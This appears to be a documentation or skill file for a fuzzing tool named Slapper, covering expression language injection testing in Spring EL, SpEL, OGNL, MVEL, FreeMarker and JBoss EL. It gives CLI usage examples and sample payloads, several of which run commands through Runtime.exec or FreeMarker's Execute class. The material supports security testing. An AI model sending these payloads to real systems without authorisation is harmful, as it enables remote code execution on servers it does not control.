---
name: expression_injection
description: "Expression language injection for Spring EL, OGNL, JBoss EL, MVEL, SpEL, and Freemarker"
triggers:
  - expression injection
  - spring el
  - ognl injection
  - mvel injection
  - spel injection
  - freemarker injection
  - jboss el
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: web_targets
---

## Overview

Slapper supports expression language injection testing for various EL implementations used in Java-based frameworks. These vulnerabilities allow attackers to execute arbitrary code or access sensitive data.

## Supported Frameworks

| Framework | Payloads | Risk |
|-----------|----------|------|
| Spring EL | 9+ | RCE |
| OGNL | 9+ | RCE |
| MVEL | 5+ | RCE |
| SpEL | 6+ | RCE |
| FreeMarker | 5+ | RCE, file access |
| JBoss EL | 4+ | RCE |
| Bypass | 2+ | WAF bypass |

## Usage

```bash
# Basic expression injection scan
slapper fuzzer --target http://target.com/api --payload-type expression

# Java-based target
slapper fuzzer --target http://target.com/springapp --payload-type expression
```

## Injection Techniques

### Spring EL
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${''.class.forName('java.lang.Runtime')}
```

### OGNL
```java
${#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')}
```

### MVEL
```java
{@java.lang.System@getProperty('user.dir')}
```

### SpEL
```java
#{T(java.lang.Runtime).getRuntime().exec('id')}
```

### FreeMarker
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex('id')}
```

## Triggers

Keywords: expression injection, spring el, ognl, mvel, spel, freemarker, jboss el, expression language, template injection, java injection

## References

- `fuzzer/payloads/expression.rs` - Payload implementations
- `PayloadType::Expression` - Integration point
